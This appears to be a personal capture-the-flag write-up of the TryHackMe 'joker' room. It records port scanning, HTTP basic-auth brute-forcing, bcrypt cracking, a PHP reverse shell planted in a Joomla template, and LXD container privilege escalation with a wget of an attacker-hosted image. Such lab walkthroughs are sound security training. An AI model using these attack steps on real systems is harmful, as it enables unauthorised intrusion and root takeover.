# Initial Footprint

```shell-session
nmap -sV --open -oA joker_scan joker.thm

# Nmap 7.94SVN scan initiated Tue Nov 26 09:41:39 2024 as: nmap -sV --open -oA joker_scan joker.thm
Nmap scan report for joker.thm (10.10.6.84)
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 26 09:41:51 2024 -- 1 IP address (1 host up) scanned in 12.51 seconds
```

## Open Ports

- `22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
- `80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))`
- `8080/tcp open  http    Apache httpd 2.4.29`

## Web Enum

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker]
└─$ curl http://joker.thm/ | grep -o '<!--.*-->' > comments.txt

┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker]
└─$ cat comments.txt
<!--You can't win anyway... You see, I hold the winning card!-->
<!--"I won't even waste the usual Joker Venom on you, Brute, but give you something you can understand...lead!-->
<!--Very neat! That ugly head of yours does have a brain!-->
<!--I'm not mad at all! I'm just differently sane!!-->
<!--More powerful than a locomotive, and just about as subtle-->
<!--One by One, they'll hear my call. Then this wicked town, will follow my fall.-->
<!--It's a clear choice me or Pettit. Vote or die. Cancer or tuberculosis.-->
<!--If I weren't crazy, I'd be insane!-->
<!--You dirty rat! You killed my brother! My sister! My daughter! She's my sister and my daughter!-->
<!--Quick question: When the clock strikes twelve, do I get a little kiss?-->
<!--Hello Late-Show lovers...and lovers of the Late-Show!-->
<!--Live...and in person! The Caliph of Clowns, the Grand Mogul of Mountebanks, the One and Only JOKER! Prerecorded for this time zone.-->
<!--Every clown loves kids, captain. Just ask Sarah Essen-Gordon. Oh, that's right, you can't!-->
<!--If the police expect to play against the Joker, they'd better be prepared to be dealt from the bottom of the deck! -->
<!--If I weren't insane: I couldn't be so brilliant!-->
<!--You can't kill me without becoming like me! I can't kill you without losing the only human being who can keep up with me! Isn't it IRONIC?-->
<!--The real joke is your stubborn, bone deep conviction that somehow, somewhere, all of this makes sense! That's what cracks me up each time!-->
<!--Devil is double is deuce, my dear doctor ... and joker trumps deuce.-->
<!--You fell for the old fake Joker gag, Batman! You left me to die!-->
<!--I've killed your girlfriend, poisoned Gotham, and hell... it's not even breakfast! But so what? We all know you'll save me.-->
<!--Get out of the way, Bats! I've got a date with immortality!-->
<!--Hurry! Batman's just had his way with one of you! Now that's a spicy meat-a-ball!-->
<!--NOW THIS IS WHAT I CALL A PARTY!!-->
<!--Jingle bells, Batman smells, Gotham's quite a mess! Blackgate's mine and you're out of time, which means you'll soon be dead!-->
<!--Where, oh where has my little Bat gone? Oh where, oh where can he be? His cowl, his scowl, his temper so foul. I do hope he's coming for me.-->
<!--Well, I'd love to stay and celebrate your victory, but I've got stockings to stuff, mistletoe to hang - and about fifteen skyscrapers to blow up before sunrise. Ciao-->
<!--Who's gonna save Gotham now? Robin?!-->
<!--You can't win anyway... You see, I hold the winning card!-->
<!--All I have are negative thoughts.-->
<!--I used to think that my life was a tragedy. But now I realize, it’s a comedy.-->
<!--Smile, because it confuses people. Smile, because it's easier than explaining what is killing you inside.-->
<!--As you know, madness is like gravity...all it takes is a little push.-->
<!--If you’re good at something, never do it for free.-->
<!--Nobody panics when things go “according to plan”. Even if the plan is horrifying!-->
<!--Introduce a little anarchy. Upset the established order, and everything becomes chaos. I'm an agent of chaos...-->
<!--Oh I really look like a guy with a plan? You know what I am? I'm a dog chasing cars. I wouldn't know what to do with one if I caught it!-->
<!--What doesn't kill you, simply makes you stranger!-->
<!--Why so serious?-->
<!--They Laugh At me Because I'm Different. I laugh At Then Because The're all the same-->
<!--The only sensible way to live in this world is without rules.-->
<!--Tell your men they work for me now, this is my city!-->
<!--I'm not gonna kill ya. I'm just gonna hurt ya... really, really bad. -->
<!-- I wouldn't want you to break those perfect porcelain-capped teeth when the juice hits your brain.-->
<!--Stupid Bats, you're ruining date night! -->
<!--Are you sweet talkin' me? All'a that chitchat's gonna getcha hurt-->
<!--Twinkle, twinkle, little bat. Watch me kill your favorite cat.-->
<!--Ha ha ha ha ha ha ha ha Its a good joke isn't-->
<!--I did it! I finally killed Batman! In front of a bunch of vulnerable, disabled, kids!!!! Now get me Santa Claus!-->
```

- I can't read this stuff these are annoying cause I didn't watch anything about joker!

![[Pasted image 20241128184453.png]]

- There is a login page at port 8080
- I tried it with `admin` and `admin` but didn't work !

```sh
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://joker.thm/

/.hta                 (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/css                  (Status: 301) [Size: 304] [--> http://joker.thm/css/]
/img                  (Status: 301) [Size: 304] [--> http://joker.thm/img/]
/index.html           (Status: 200) [Size: 5954]
/phpinfo.php          (Status: 200) [Size: 94735]
/server-status        (Status: 403) [Size: 274]
/secret.txt           (Status: 200) [Size: 95648]
``` 

- `/phpinfo.php`  and `/secret.txt `   seem juicey

![[Pasted image 20241128185010.png]]

- There is a lot of data here

![[Pasted image 20241128185406.png]]

- The secret.txt gives us info about some name and file maybe it could be rockyou.txt and the username might be joker or batman

## Brute-Forcing 

- Trying to get the password for the username joker and  the room gave us a hint

![[Pasted image 20241128185817.png]]

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker]
└─$ hydra -l joker -P /usr/share/wordlists/rockyou.txt http-get://joker.thm:8080/

[8080][http-get] host: joker.thm   login: joker   password: hannah
```
- user - joker
- password - hannah

##  Web Enum 2.0

![[Pasted image 20241128190132.png]]

- mmm! It seems that it is a joomla site
- Maybe I need to do something about the joomla plugins ! 🙄🙄🙄🙄
- So I tried a nikto scan to enumerate the web contents. This will give me some juicy directories

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker]
└─$ nikto -h http://joker.thm:8080/ -id joker:hannah
```
![[Pasted image 20241128190705.png]]
- This `administrator` would be a login panel for the joomla cms site .
- mmm! Lets brute force the name `admin` with the `rockyou.txt `file
- ` /backup.zip` this looks interesting 

## Brute-Forcing 2.0

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://joker.thm:8080/administrator/

```

![[Pasted image 20241128193113.png]]
- But it doesn't work
- Lets Try the `backup.zip` file
- When I tried To unzip it It needed a password so I gave the password `hannah` and it worked perfectly
- After unzipping we have gotten to directories which is `site` and `db`

## Analysing The Zip Folder

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/site]
└─$ ls
administrator  cache  components         htaccess.txt  includes   language  libraries    media    plugins     robots.txt  tmp
bin            cli    configuration.php  images        index.php  layouts   LICENSE.txt  modules  README.txt  templates   web.config.txt

┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/site]
└─$ cat configuration.php

 public $db = 'joomladb';
 
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/db]
└─$ cat joomladb.sql | grep user
-----
```

- I have gotten a huge amount of data
- But things that have `CREATE TABLE ` looks fishy
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/db]
└─$ cat joomladb.sql | grep admin | grep user

INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
```

**Hash**

```sh
$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
```

## Brute-Forcing 3.0

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/db]
└─$ john hello.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)

┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/db]
└─$ john hello.hash --wordlist=/usr/share/wordlists/rockyou.txt

┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker/db]
└─$ john --show hello.hash
?:abcd1234

1 password hash cracked, 0 left
```

**user:`admin`**
**pass:`abcd1234`**


![[Pasted image 20241128202940.png]]

![[Pasted image 20241128203019.png]]

- There is a lot of things here
- It took me 2 days to find where I can get the reverse shell
- But I got the url
![[Pasted image 20241128210404.png]]
- After pasting the php reverse shell we can hit save and close 
- Now we have to generate an error so that the `error.php` command runs well
- And we can get the reverse shell
- I have my listener on
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/joker]
└─$ nc -nlvp 1234
listening on [any] 1234 ...

```

- `http://joker.thm:8080/templates/beez3/error.php`  Using this url we have gotten the reverse shell easily 
## Getting the terminal Shell

- **Some time the terminal shell is not given then we have to do this!**

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```

```sh
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```
- Oh! Its is a lxd so we will do some lxd privilege escalation

# LXD/LXC PrivEsc

**My Machine**

```sh
┌──(bc-here㉿BC-Here)-[~/CTF/PrivEsc/lxd-alpine-builder]
└─$ ls
alpine-v3.13-x86.tar.gz  build-alpine  LICENSE  metadata.yaml  README.md  rootfs  templates

┌──(bc-here㉿BC-Here)-[~/CTF/PrivEsc/lxd-alpine-builder]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.204.196 - - [28/Nov/2024 21:15:45] "GET /alpine-v3.13-x86.tar.gz HTTP/1.1" 200 -
```

**Target Machine**
```sh
www-data@ubuntu:/tmp$ wget http://10.14.92.43:8080/alpine-v3.13-x86.tar.gz
--2024-11-28 07:15:49--  http://10.14.92.43:8080/alpine-v3.13-x86.tar.gz
Connecting to 10.14.92.43:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: 'alpine-v3.13-x86.tar.gz'

alpine-v3.13-x86.ta 100%[===================>]   3.11M  1.45MB/s    in 2.1s

2024-11-28 07:15:52 (1.45 MB/s) - 'alpine-v3.13-x86.tar.gz' saved [3259593/3259593]

www-data@ubuntu:/tmp$ ls
alpine-v3.13-x86.tar.gz  mypluggin  mypluggin.zip

www-data@ubuntu:/tmp$ tar -xvzf alpine-v3.13-x86.tar.gz

www-data@ubuntu:/tmp$ ls
alpine-v3.13-x86.tar.gz  mypluggin      rootfs
metadata.yaml            mypluggin.zip  templates

www-data@ubuntu:/tmp$ lxc image import ./alpine-* --alias myimage

www-data@ubuntu:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Nov 28, 2024 at 3:17pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
www-data@ubuntu:/tmp$ lxc init myimage image -c security.privileged=true
Creating image
nt/root recursive=truelxc config device add image mydevice disk source=/ path=/mn
Device mydevice added to image

www-data@ubuntu:/tmp$ lxc start image

www-data@ubuntu:/tmp$ lxc exec image /bin/sh
~ # whoami
root
~ # find / -type f -name "*.txt" | grep root
/mnt/root/root/final.txt

~ # cat /mnt/root/root/final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+

```

# PWNED!